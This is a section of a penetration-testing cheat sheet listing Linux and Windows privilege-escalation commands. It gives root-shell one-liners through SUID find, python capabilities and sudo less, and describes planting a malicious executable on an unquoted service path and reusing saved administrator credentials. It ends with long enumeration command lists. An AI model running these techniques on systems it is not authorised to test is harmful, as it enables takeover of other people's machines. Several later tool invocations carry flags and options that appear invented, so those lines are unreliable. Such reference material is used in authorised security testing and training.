### 6.1 Privilege Escalation
#### 6.1.1 Linux Privilege Escalation
    # Find SUID binaries:    find / -perm -u=s -type f 2>/dev/null

    # Check GTFOBins for exploitation (Assume 'find' binary has SUID)    
    https://gtfobins.github.io/gtfobins/find/
    
    # Exploit SUID find for root shell
    find . -exec /bin/sh -p \; -quit

    # Check sudo permissions:    sudo -l

    # Exploit sudo permission (Assume user can run 'less' as root)    
    https://gtfobins.github.io/gtfobins/less/
    sudo less /etc/profile

    # Execute shell via less '!' command
    
    # (Inside less, type !/bin/sh)
    
    # Check Cron Jobs:    
    ls -la /etc/cron*
    
    cat /etc/crontab

    # Check Capabilities:    
    getcap -r / 2>/dev/null

    # Exploit capabilities (Assume /usr/bin/python has cap_setuid+ep)    
    https://gtfobins.github.io/gtfobins/python/
    
    # Use python capability to get root shell
    /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")' 

    # Linux PrivEsc Check Scripts (Re-iteration with common flags)    
    # Run all checks (noisy)
    linpeas.sh -a
    
    # Linux Smart Enumeration, level 0 (quick overview)
    lse.sh -i -l 0
    ----
    linpeas.sh
    linpeas.sh -a -t -s -p -c -S -r -e -P -C
    linux-exploit-suggester.sh -k 5.4.0-26-generic
    pspy64
    pspy64 -p -i -U -C -f
    SUID3NUM -q -p -s -g
    ------
    linpeas.sh -a -t -s -p -c -S -r -e -P -C -l -u -n -i -d /tmp -w /tmp/writable
    linux-exploit-suggester.sh -k $(uname -r) -l
    searchsploit Linux kernel $(uname -r)
    find / -perm -u=s -type f 2>/dev/null
    find / -perm -g=s -type f 2>/dev/null
    find / -writable -type d 2>/dev/null
    find / -user $(whoami) -perm -0400 -type f 2>/dev/null
    pspy64 -p -i -U -C "/bin/bash" -f "root"
    SUID3NUM -q -p -s -g -w
    ------
    linpeas.sh -a -t -s -p -c -S -r -e -P -C -l -u -n -i -d /tmp -w /tmp/writable -b -o /tmp/linpeas_full.txt
    linux-exploit-suggester.sh -k $(uname -r) -l -c
    searchsploit Linux kernel $(uname -r) local privesc
    find / -perm -o=w -type f 2>/dev/null
    find / -nouser -o -nogroup -type f 2>/dev/null
    find / -name "*.so" -perm -u=s -type f 2>/dev/null
    pspy64 -p -i -U -C "/usr/bin/sudo" -f "$(whoami)"
    SUID3NUM -q -p -s -g -w -v

#### 6.1.2 Windows Privilege Escalation
    # Find interesting files/permissions:
    
    # Check permissions for Authenticated Users
    accesschk.exe -wsu "Authenticated Users" c:\*.* /accepteula
    
    # Check ACLs for a file
    icacls C:\path\to\file

    # Check AlwaysInstallElevated registry keys:    
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    (If both are 1, can create MSI for SYSTEM privileges)

    # Check Unquoted Service Paths:    
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

    # Exploit Unquoted Service Path (Assume service path is C:\Program Files\Some Dir\service.exe)    
    (Place malicious service.exe at C:\Program.exe or C:\Program Files\Some.exe)

    # Check for stored credentials:    
    cmdkey /list
    
    # Example leveraging saved creds
    runas /savecred /user:administrator cmd.exe

    # Windows PrivEsc Check Tools (Re-iteration)    
    # WinPEAS faster checks, cmd output
    winPEASany.exe quiet cmd fast
    
    # PowerSploit's PowerUp module
    PowerUp.ps1 (Import-Module .\PowerUp.ps1; Invoke-AllChecks)
    ---
    winpeas.exe
    winpeas.exe all quiet csv outputfile=winpeas.csv
    windows-exploit-suggester.py --database 2021-04-15-mssb.xls --ostext 'Windows 10'
    Watson.exe --search all --output results.txt
    ------
    winpeas.exe all quiet csv outputfile=winpeas_full.csv -nobanner
    windows-exploit-suggester.py --database 2023-01-01-mssb.xls --ostext 'Windows Server 2019' --arch 64
    Watson.exe --search all --output results_full.txt --modules kernel32.dll,advapi32.dll
    accesschk.exe -quvwc users c:\
    accesschk.exe -quvwc "Authenticated Users" "HKLM\SYSTEM\CurrentControlSet\Services"
    Get-Process -Id 1 | Get-ObjectSecurity | Format-List -Property *
    Get-Service | Where-Object {$_.StartMode -eq "Auto" -and $_.StartName -ne "NT AUTHORITY\SYSTEM"}
    ------
    winpeas.exe all quiet csv outputfile=winpeas_very_full.csv -nobanner -detailed
    windows-exploit-suggester.py --database 2024-01-01-mssb.xls --ostext 'Windows Server 2022' --arch 64 --cve CVE-2020-*
    Watson.exe --search all --output results_extensive.txt --modules *.dll
    accesschk.exe -quvwc everyone c:\windows
    accesschk.exe -quvwce "NT AUTHORITY\SYSTEM" * /accepteula
    Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.StartName -like "*LocalSystem*"} | Format-Table Name, StartName, PathName
    Get-ScheduledTask | Where-Object {$_.settings.runlevel -eq "HighestAvailable"} | Format-Table TaskName, Author